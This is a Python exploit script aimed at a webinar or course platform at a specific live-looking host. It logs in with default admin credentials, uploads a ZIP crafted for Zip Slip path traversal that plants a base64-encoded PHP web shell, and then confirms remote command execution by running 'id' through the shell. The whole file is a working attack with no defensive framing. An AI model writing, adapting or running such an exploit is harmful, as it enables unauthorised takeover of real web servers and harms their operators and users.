import requests
import zipfile
import io
import re
import os
import json
import base64
import time
import random
import string

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
ADMIN_EMAIL = "admin@demo.com"
ADMIN_PASS = "admin"

session = requests.Session()

def login():
    print("[*] Logging in...")
    try:
        r = session.get(f"{BASE_URL}/admin/login")
        csrf_token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
        data = {"_token": csrf_token, "email": ADMIN_EMAIL, "password": ADMIN_PASS}
        r = session.post(f"{BASE_URL}/admin/login", data=data)
        if "/admin" in r.url or "/panel" in r.url:
            print("[+] Login Success")
            return True
        return False
    except Exception as e:
        print(f"[-] Login error: {e}")
        return False

def get_csrf(url):
    r = session.get(url)
    match = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if match: return match.group(1)
    match = re.search(r'name="_token" value="([^"]+)"', r.text)
    if match: return match.group(1)
    return None

def main():
    if not login():
        print("[-] Login failed.")
        return

    # 1. Scrape webinar from Admin Panel
    r = session.get(f"{BASE_URL}/admin/webinars")
    web_match = re.search(r'/admin/webinars/(\d+)/edit', r.text)
    web_id = web_match.group(1) if web_match else "2009"

    # 2. Find Chapter ID
    r = session.get(f"{BASE_URL}/admin/webinars/{web_id}/edit")
    chapter_match = re.search(r'chapter_id":(\d+)', r.text)
    chap_id = chapter_match.group(1) if chapter_match else "30"
    print(f"[*] Target Webinar: {web_id}, Chapter: {chap_id}")

    # 3. Create shell ZIP with deep Zip Slip payload
    # Path: /1/webinars/2009/files/zipname/ -> 5 levels deep inside 'store'
    # Disk root is public/store/ -> ../../../../../../s.php should land in public/
    rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
    zip_filename = f"{rand_name}.zip"
    print(f"[*] Creating {zip_filename} with deep Zip Slip payload...")
    
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as z:
        # shell: <?php system($_GET["c"]); ?>
        pay = base64.b64decode("PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==").decode()
        # 10 levels to be extra sure we hit root
        z.writestr('../../../../../../../../../../sx.php', pay)
    buf.seek(0)

    # 4. Trigger store via Panel (where handleUnZipFile is called)
    csrf = get_csrf(f"{BASE_URL}/panel/courses/{web_id}/edit")
    if not csrf:
        print("[-] CSRF not found.")
        return
        
    print(f"[*] Uploading and triggering deep Zip Slip extraction...")
    payload = {
        'ajax[new][webinar_id]': web_id,
        'ajax[new][chapter_id]': chap_id,
        'ajax[new][title]': 'Deep Slip ' + rand_name,
        'ajax[new][accessibility]': 'free',
        'ajax[new][storage]': 'upload_archive',
        'ajax[new][interactive_type]': 'custom',
        'ajax[new][interactive_file_name]': 'sx.php',
        'ajax[new][status]': 'on',
        '_token': csrf
    }
    files = {'ajax[new][file_upload]': (zip_filename, buf, 'application/zip')}
    
    r = session.post(f"{BASE_URL}/panel/files/store", data=payload, files=files)
    print(f"[*] Post Response: {r.status_code}")
    
    # 5. Verify Shell at public root
    shell_url = f"{BASE_URL}/sx.php"
    print(f"[*] Checking {shell_url}...")
    try:
        res = session.get(shell_url + "?c=id", timeout=5)
        if res.status_code == 200 and "uid=" in res.text:
            print(f"[!!!!] SUCCESS! DEEP ZIP SLIP WORKED! Shell: {shell_url}?c=id")
            print(f"Output: {res.text.strip()}")
            return
        else:
            print(f"[-] Root shell not found (Status: {res.status_code})")
    except Exception as e:
        print(f"[-] Verification error: {e}")

    # Fallback: Maybe one level up from store? (/var/www/html/s.php?)
    print("[-] Attempting to find shell in other root variations...")
    # Add more logic if needed

if __name__ == "__main__":
    main()
